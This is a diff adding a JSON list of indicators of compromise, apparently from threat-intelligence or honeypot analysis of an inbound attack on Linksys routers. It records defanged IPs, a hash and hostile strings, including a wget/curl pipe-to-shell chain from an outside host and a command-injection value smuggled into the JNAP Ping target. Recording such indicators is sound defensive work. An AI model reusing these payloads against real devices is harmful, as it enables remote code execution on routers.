@@ -1,0 +1,45 @@
+[
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://91[.]92[.]40[.]XXX/wget.sh%20-O-%7Csh%20-s%20ljnap2%3Bbusybox%20wget%20hxxp://91[.]92[.]40[.]XXX/wget.sh%20-O-%7Csh%20-s%20ljnap2%3Bcurl%20hxxp://91[.]92[.]40[.]XXX/wget.sh%7Csh%20-s%20ljnap2"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://linksys[.]com/jnap/network/Diagnostics"
+  },
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "190[.]179[.]139.XXX"
+  },
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "91[.]92[.]40.XXX"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "{\"JNAP\":{\"action\":\"hxxp://linksys[.]com/jnap/network/Diagnostics\",\"command\":\"Ping\",\"target\":\"[internal-ip-redacted]%20`cd%20/tmp%3Bwget"
+  },
+  {
+    "context": "Inbound payload hash (unknown)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "804bdfee152d0b540632fe13720b90096cac51ee50f1c98511aae23f2c709e95"
+  },
+  {
+    "asn": "TechTies Inc.",
+    "country": "The Netherlands",
+    "role": "artifact_source",
+    "type": "ip",
+    "value": "45[.]153[.]34.XXX"
+  }
+]
